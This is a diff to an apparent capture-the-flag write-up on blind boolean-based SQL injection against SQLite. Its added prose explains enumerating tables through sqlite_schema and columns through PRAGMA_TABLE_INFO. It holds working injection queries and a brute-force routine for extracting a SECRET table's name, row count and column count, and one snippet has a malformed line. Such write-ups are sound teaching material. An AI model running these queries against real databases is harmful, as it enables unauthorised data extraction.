@@ -131,13 +131,15 @@ print(find_number_value()) # 1192285233
 This looks like a random number, so let's explore the database even more.
 
 ### Exploring other tables
+At this point, we're using the meta table `sqlite_schema` to gain information about existing tables:
+
 After confirming the number of tables was bigger than `1`, we managed to fix the table count to `2`.
 ```python
 guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM sqlite_schema) > 1") # True
 guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM sqlite_schema) = 2") # True
 ```
 
-Now we have to find the name of the unknown table, which requires us to enumerate strings:
+Now we have to find the name of the unknown table, which requires us to enumerate strings; specifically the `name` column of the meta table `sqlite_schema`:
 ```python
 # Declare an alphabet for brute forcing strings:
 ALPHABET = [chr(x) for x in range(0x20, 0x7F)]
@@ -185,7 +187,9 @@ guess('SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET) = 1') # False
 guess('SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET) = 2') # True
 ```
 
-Then we managed to fix the column count to `1`:
+Now we need the column names of the SECRET table to be able to retrieve their values using a boolean based query. That's why we want to query the `name` column of the `PRAGMA_TABLE_INFO('SECRET')` statement, which returns all the column names of the specified table:
+
+We managed to fix the column count to `1` using:
 ```python
 def check_column_count(table_name, expected_count):
 	col_count_res = guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM (SELECT name FROM PRAGMA_TABLE_INFO('" + table_name + "'))) " + str(expected_count)))
